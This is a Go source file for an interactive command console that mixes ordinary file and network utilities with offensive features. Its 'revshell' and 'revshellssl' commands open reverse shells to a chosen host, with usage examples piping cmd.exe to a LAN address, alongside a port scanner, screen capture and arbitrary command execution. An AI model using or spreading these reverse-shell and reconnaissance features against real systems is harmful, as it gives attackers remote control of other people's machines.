package main

// Author : Unam3dd

import (
	"fmt"
	"image"
	"os"
	"runtime"
	"strconv"
	"strings"

	golang_tts "github.com/zhaopuyang/golang-tts"

	"github.com/Unam3dd/displaynetwork"
	"github.com/Unam3dd/reverseshell"
	"github.com/Unam3dd/system"
	"github.com/abiosoft/ishell"
	"github.com/fatih/color"
	"github.com/kbinani/screenshot"
)

func Loop() {
	Shell := ishell.New()
	system.ClearConsole()
	Shell.Print("\n")
	Shell.SetPrompt(color.GreenString("\u039B \u003E "))

	Shell.AddCmd(&ishell.Cmd{
		Name: "process",
		Help: "process <process>",
		Func: func(c *ishell.Context) {
			system.ExecuteProcess(strings.Join(c.Args, " "))
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "quit",
		Help: "quit console",
		Func: func(c *ishell.Context) {
			os.Exit(0)
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "touch",
		Help: "touch <file1> <file2>",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : touch <file1> <file2>")
			} else {
				for _, f := range c.Args {
					err := system.Create(f)

					if err != nil {
						Shell.Println(err)
					}

					Shell.Println("[+] ", f, " Created !")
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "cd",
		Help: "cd <path>",
		Func: func(c *ishell.Context) {
			changed := system.CD(c.Args[0])
			if changed == false {
				Shell.Printf("[-] Error : %s not found !\n", strings.Join(c.Args, " "))
			}

			p, e := system.Pwd()

			if e != nil {
				Shell.Println(e)
			}

			Shell.Printf("[+] Dir Changed %s\n", p)
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "pwd",
		Help: "pwd Return Current Path",
		Func: func(c *ishell.Context) {
			p, e := system.Pwd()
			if e != nil {
				Shell.Println(e)
			}
			Shell.Println(p)
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "getusername",
		Help: "Get Username",
		Func: func(c *ishell.Context) {
			p, e := system.GetNameInformations()

			if e != nil {
				Shell.Println(e)
			}
			if runtime.GOOS == "windows" {
				Shell.Println("[+] Username : ", p[1])
			} else {
				Shell.Println("[+] Username : ", p[0])
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "lsal",
		Help: "List directory all informations",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				files, err := system.Ls(".")

				if err != nil {
					Shell.Println(err)
				}

				for _, f := range files {
					t := f.ModTime()
					year, month, day := t.Date()
					h, m, s := t.Clock()
					time := fmt.Sprintf("%d %s %02d %02d:%02d:%02d", year, month.String()[:3], day, h, m, s)
					if f.IsDir() == true {
						Shell.Println(f.Mode(), " ", time, " ", f.Size(), " ", f.Name())
					} else {
						Shell.Println(f.Mode(), " ", time, " ", f.Size(), " ", f.Name())
					}
				}
			} else {
				files, err := system.Ls(c.Args[0])

				if err != nil {
					Shell.Println(err)
				}

				for _, f := range files {
					t := f.ModTime()
					year, month, day := t.Date()
					h, m, s := t.Clock()
					time := fmt.Sprintf("%d %s %02d %02d:%02d:%02d", year, month.String()[:3], day, h, m, s)
					if f.IsDir() == true {
						Shell.Println(f.Mode(), " ", time, " ", f.Size(), " ", f.Name())
					} else {
						Shell.Println(f.Mode(), " ", time, " ", f.Size(), " ", f.Name())
					}
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "dir",
		Help: "List directory",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				files, err := system.Ls(".")

				if err != nil {
					Shell.Println(err)
				}

				for _, f := range files {
					Shell.Println(f.Name())
				}
			} else {
				files, err := system.Ls(c.Args[0])

				if err != nil {
					Shell.Println(err)
				}

				for _, f := range files {
					Shell.Println(f.Name())
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "ls",
		Help: "List directory",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				files, err := system.Ls(".")

				if err != nil {
					Shell.Println(err)
				}

				for _, f := range files {
					Shell.Println(f.Name())
				}
			} else {
				files, err := system.Ls(c.Args[0])

				if err != nil {
					Shell.Println(err)
				}

				for _, f := range files {
					Shell.Println(f.Name())
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "cat",
		Help: "cat <file> Read File",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : cat <file>")
			} else {
				system.Cat(c.Args[0])
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "type",
		Help: "type <file> Read File",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : type <file>")
			} else {
				system.Cat(c.Args[0])
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "mkdir",
		Help: "mkdir <folder> Create Directory",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : mkdir <folder1> <folder2> <folder3>")
			} else {
				for _, folder := range c.Args {
					err := system.Mkdir(folder)

					if err != nil {
						Shell.Println(err)
					}
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "rm",
		Help: "rm <file> remove file",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : rm <file1> <file2> <file3>")
			} else {
				for _, f := range c.Args {
					err := system.Rm(f)
					if err != nil {
						Shell.Println(err)
					}
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "rmthis",
		Help: "rmthis erase all content of actual current dirrectory",
		Func: func(c *ishell.Context) {
			cp, err := system.Pwd()

			if err != nil {
				Shell.Println(err)
			}

			e := system.Rmr(cp)

			if e != nil {
				Shell.Println(e)
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "del",
		Help: "del <file> remove file",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : del <file1> <file2> <file3>")
			} else {
				for _, f := range c.Args {
					err := system.Rm(f)
					if err != nil {
						Shell.Println(err)
					}
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "rmdir",
		Help: "rmdir <path> remove folder",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : rmdir <folder1> <folder2> <folder3>")
			} else {
				for _, f := range c.Args {
					err := system.RmDir(f)
					if err != nil {
						Shell.Println(err)
					}
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "ren",
		Help: "ren <path/folder> <newname> rename file or folder",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 2 {
				Shell.Println("usage : ren <path/folder> <newname>")
			} else {
				err := system.Rename(c.Args[0], c.Args[1])
				if err != nil {
					Shell.Println(err)
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "get",
		Help: "get <URL> Get Body URL",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : get <URL>")
			} else {
				body, err := displaynetwork.HttpGet(c.Args[0])

				if err != nil {
					Shell.Println(err)
				}

				Shell.Println(body)
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "mygeo",
		Help: "mygeo Get My Geolocation by IP",
		Func: func(c *ishell.Context) {
			displaynetwork.GeoIP()
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "revshell",
		Help: "revshell <ip:port> <process> to reverse connections",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 2 {
				Shell.Println("usage : revshell <ip:port> <process>\nexemple : revshell 192.168.1.27:5445 cmd.exe\nexemple with go routine : revshell 192.168.1.27:555 cmd.exe &")
			} else {
				if len(c.Args) == 3 {
					go reverseshell.ReverseShell(c.Args[0], c.Args[1])
				} else {
					reverseshell.ReverseShell(c.Args[0], c.Args[1])
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "revshellssl",
		Help: "revshellssl <ip:port> <process> to reverse connections",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 2 {
				Shell.Println("usage : revshellssl <ip:port> <process>\nexemple : revshellssl 192.168.1.27:5445 cmd.exe\nexemple with go routine : revshellssl 192.168.1.27:555 cmd.exe &")
			} else {
				if len(c.Args) == 3 {
					go reverseshell.ReverseShellSSL(c.Args[0], c.Args[1])
				} else {
					reverseshell.ReverseShellSSL(c.Args[0], c.Args[1])
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "runserver",
		Help: "runserver ip:port Run Simple Server",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : runserver 192.168.1.27:555\ngo routine : runserver 192.168.1.27:555 &")
			} else {
				if len(c.Args) == 3 {
					go displaynetwork.RunServer(c.Args[0])
				} else {
					displaynetwork.RunServer(c.Args[0])
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "pscan",
		Help: "pscan <ip> <max_port> <ms sleep>",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 3 {
				Shell.Println("usage : pscan <ip> <max_port> <ms sleep>\npscan 192.168.1.27 1000 100")
			} else {
				displaynetwork.PortScanner(c.Args[0], c.Args[1], c.Args[2])
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "getgeo",
		Help: "getgeo <IP> Get Geolocation by IP",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("getgeo <IP> Get Geolocation by IP")
			} else {
				displaynetwork.GetGeoIP(c.Args[0])
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "alookup",
		Help: "alookup <hostname>",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("alookup <hostname>")
			} else {
				r, e := displaynetwork.Lhost(c.Args[0])

				if e != nil {
					Shell.Println(e)
				}

				Shell.Printf("[+] DNS : %s\n", c.Args[0])

				for _, a := range r {
					Shell.Printf("[+] IP : %s\n", a)
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "nslookup",
		Help: "nslookup <dns>",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("nslookup <dns>")
			} else {
				r, e := displaynetwork.Laddr(c.Args[0])

				if e != nil {
					Shell.Println(e)
				}

				Shell.Printf("[+] IP : %s\n", c.Args[0])

				for _, a := range r {
					Shell.Printf("[+] DNS : %s\n", a)
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "curlget",
		Help: "curlget <link> <object>",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 2 {
				Shell.Println("curlget <link> <status/statuscode/body/ua/method/host/all>")
			} else {
				req := displaynetwork.HttpCurlGET(c.Args[0])

				if req.Er != nil {
					Shell.Println(req.Er)
				}

				if c.Args[1] == "status" {
					Shell.Println("[+] Status : ", req.Status)
				} else if c.Args[1] == "statuscode" {
					Shell.Println("[+] Status Code : ", req.StatusCode)
				} else if c.Args[1] == "body" {
					Shell.Println(req.Body)
				} else if c.Args[1] == "all" {
					Shell.Println("[+] Status : ", req.Status)
					Shell.Println("[+] Status Code : ", req.StatusCode)
					Shell.Println("[+] Body : ", req.Body)
					Shell.Println("[+] Method : ", req.Method)
					Shell.Println("[+] Host : ", req.Host)
					Shell.Println("[+] Protocol : ", req.Proto)
				} else if c.Args[1] == "host" {
					Shell.Println("[+] Host : ", req.Host)
				} else {
					Shell.Println("[!] Error Options !\nusage : curlget <link> <status/statuscode/body/header/method/host/all>")
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "write",
		Help: "write <filename> write in file",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : write <filename> write in file>")
			} else {
				Shell.Println("[i] when you have finished writing to the file write 'EOF' then enter")
				lines := c.ReadMultiLines("EOF")
				data := []byte(lines)
				err := system.WriteFile(c.Args[0], data)
				if err != nil {
					Shell.Println(err)
				} else {
					Shell.Println("[i] ", c.Args[0], " File writed !")
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "exec",
		Help: "exec <command>",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : exec <command>")
			} else {
				system.System(strings.Join(c.Args, " "))
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "googlesearch",
		Help: "googlesearch <search/help>",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : googlesearch <search>\nexemple : googlesearch <search>\nexemple : googlesearch <search> <country> <lang> <limit>\ndefaults : googlesearch apple us en")
			} else if len(c.Args) == 1 {
				displaynetwork.Googlesearch(c.Args[0], "us", "en")
			} else if len(c.Args) == 2 {
				displaynetwork.Googlesearch(c.Args[0], c.Args[1], "en")
			} else if len(c.Args) == 3 {
				displaynetwork.Googlesearch(c.Args[0], c.Args[1], c.Args[2])
			} else {
				Shell.Println("usage : googlesearch <search>\nexemple : googlesearch <search>\nexemple : googlesearch <search> <country> <lang> <limit>\ndefaults : googlesearch apple us en")
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "publicip",
		Help: "show your public IP",
		Func: func(c *ishell.Context) {
			ip, err := displaynetwork.GetPublicIp()

			if err != nil {
				Shell.Println(err)
			}
			Shell.Printf("[+] Public IP : %s\n", ip)
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "ip",
		Help: "show your Local IP",
		Func: func(c *ishell.Context) {
			ip, err := displaynetwork.GetLocalAddr()

			if err != nil {
				Shell.Println(err)
			}
			Shell.Printf("[+] Local IP : %s\n", strings.Split(ip, ":")[0])
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "checkport",
		Help: "checkport <ip> <port>",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 2 {
				Shell.Println("usage : checkport <host> <port>")
			} else {
				PortInt, _ := strconv.Atoi(c.Args[1])

				Popen := displaynetwork.CheckPortConnect(c.Args[0], PortInt)

				if Popen != 0 {
					Shell.Println("[+] Host : ", c.Args[0], " \n[+] Port ", c.Args[1], ": Open !\n")
				} else {
					Shell.Println("[-] Host : ", c.Args[0], " \n[-] Port ", c.Args[1], ": Closed !\n")
				}
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "say",
		Help: "say <string>",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : say <string>")
			} else {
				golang_tts.SpeakText(c.Args[0])
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "screenshot",
		Help: "screenshot",
		Func: func(c *ishell.Context) {
			if len(c.Args) < 1 {
				Shell.Println("usage : screenshot <file>")
			} else {
				a := image.Rect(0, 0, 0, 0)
				bounds := screenshot.GetDisplayBounds(0)
				a = bounds.Union(a)

				TakeScreenShot, err := screenshot.CaptureRect(bounds)

				if err != nil {
					Shell.Println(err)
				}

				system.SaveSreenshot(TakeScreenShot, c.Args[0])
				Shell.Println(color.GreenString("[+] Screenshot Saved !"))
			}
		},
	})

	Shell.AddCmd(&ishell.Cmd{
		Name: "sysinfo",
		Help: "Get System Informations",
		Func: func(c *ishell.Context) {
			system.GetSystemInfo()
		},
	})

	Shell.Run()
}

func main() {
	Loop()
}
